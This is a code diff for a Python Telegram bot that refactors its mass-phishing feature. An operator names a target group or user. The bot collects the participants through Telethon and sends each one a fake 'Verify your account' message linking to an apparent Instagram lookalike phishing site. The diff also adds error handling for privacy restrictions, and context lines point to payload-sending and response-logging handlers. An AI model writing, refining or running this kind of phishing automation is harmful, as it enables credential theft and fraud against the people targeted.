@@ -99,40 +99,42 @@ def send_payload(message):
     else:
         bot.reply_to(message, "⚠️ You are not authorized to request this file.")
 
-# 6. Mass Messaging via Telethon
-@bot.message_handler(commands=['target'])
-def set_target(message):
-    bot.reply_to(message, "📌 Please enter the name of the target group or the username of the target user:")
-    bot.register_next_step_handler(message, mass_phishing_start)
-
-def mass_phishing_start(message):
-    target_name = message.text
-    bot.reply_to(message, f"🔍 Initiating phishing messages for: {target_name}. Please wait...")
-
-    # Start the mass phishing task
-    try:
-        client.loop.run_until_complete(mass_phishing(target_name))
-        bot.reply_to(message, f"✅ Phishing messages successfully sent to: {target_name}.")
-    except Exception as e:
-        bot.reply_to(message, f"❌ An error occurred:\n{e}")
-
-# Async mass phishing function with dynamic target name
+# Mass Phishing Function
 async def mass_phishing(target_name):
     async with client:
         try:
-            # Fetch participants for a group or a single user
-            participants = await client.get_participants(target_name)
+            # Get target entity (group, channel, or user)
+            target = await client.get_entity(target_name)
+
+            # Fetch participants
+            participants = await client.get_participants(target)
+
             for user in participants:
                 try:
+                    # Send phishing message
                     await client.send_message(user, "🚨 Important: Verify your account:\nhttps://instag-pwk3.onrender.com")
+                    print(f"Message sent to {user.id}")
+                except telethon.errors.UserPrivacyRestrictedError:
+                    print(f"Cannot message user {user.id} due to privacy settings.")
                 except Exception as e:
                     print(f"Failed to message user {user.id}: {e}")
         except Exception as e:
-            print(f"Error fetching target participants: {e}")
+            print(f"Error during mass phishing: {e}")
 
-# Run the Telethon client for mass phishing
-def start_mass_phishing():
-    client.loop.run_until_complete(mass_phishing())
+# Mass Phishing Command Handler
+@bot.message_handler(commands=['target'])
+def set_target(message):
+    bot.reply_to(message, "📌 Please enter the name of the target group or username:")
+    bot.register_next_step_handler(message, mass_phishing_start)
+
+def mass_phishing_start(message):
+    target_name = message.text.strip()
+    bot.reply_to(message, f"🔍 Starting phishing for: {target_name}. Please wait...")
+    try:
+        client.loop.run_until_complete(mass_phishing(target_name))
+        bot.reply_to(message, f"✅ Phishing messages sent to: {target_name}.")
+    except Exception as e:
+        bot.reply_to(message, f"❌ An error occurred: {e}")
 
 # 7. Log Responses
 @bot.message_handler(func=lambda msg: True)
